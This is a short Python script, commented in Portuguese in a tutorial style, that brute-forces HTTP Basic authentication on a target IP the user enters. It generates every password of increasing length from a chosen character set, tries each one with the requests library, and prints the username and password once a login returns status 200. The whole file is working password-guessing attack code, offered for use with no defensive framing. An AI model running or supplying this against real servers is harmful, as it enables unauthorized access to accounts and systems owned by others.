from datetime import datetime
import requests # importamos a biblioteca requests
import string, itertools

IP = input("Digite o IP http://") # recebemos o alvo
alvo = f"http://{IP}" 
usuario = input('Usuário: ') # definimos o usuário alvo, no prox code mostro como usar uma wordlist de usuários
força = input("Procurar:\n1 - sem números\n2 - com números\n3 - com todos caracteres existentes\n| ?: ")

if força == "1":
    characters = string.ascii_lowercase
elif força == "2":
    characters = string.ascii_lowercase + string.digits
elif força == "3":
    characters = string.printable

def gerador():
    #length = int(input("Digite com quantos caracteres deseja procurar: "))
    length = 1
    while True:
        for i in itertools.product(characters, repeat=length):
            yield "".join(i)
        length +=1

for senha in gerador(): # um loop que verifica a senha gerada
    print('[*]Gerando senha ', senha) # só mostra qual senha será testada
    login = requests.get(alvo, auth=(usuario, senha)) # a tentativa de autenticação propriamente dita
    if login.status_code == 200: # depois da tentativa de conexão, comparamos o status code com 200, onde 200 é o status code de "OK", que pra gente significa que deu certo o login
        print(f"""
[*]Senha Encontrada!
[*]Usuário: {usuario}
[*]Senha  : {senha}
""")# caso o status code seja 200, mostra o login e senha que foi possível realizar a autenticação  
        break
input("Pressione Enter para sair")
